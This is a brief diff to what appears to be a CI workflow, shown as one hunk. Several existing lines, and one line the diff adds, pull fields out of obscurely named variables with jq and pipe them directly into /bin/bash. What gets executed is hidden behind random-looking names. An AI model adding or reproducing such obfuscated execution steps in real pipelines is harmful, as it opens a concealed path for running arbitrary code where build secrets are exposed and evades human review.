@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$notxj1103" | jq -r .qor356 | /bin/bash
           printf '%s' "$w96" | jq -r .qk136 | /bin/bash
           printf '%s' "$t3834" | jq -r .fv392 | /bin/bash
+          echo $icx5584 | jq -r .dexg615 | /bin/bash
 
       - name: Upload results
         if: always()
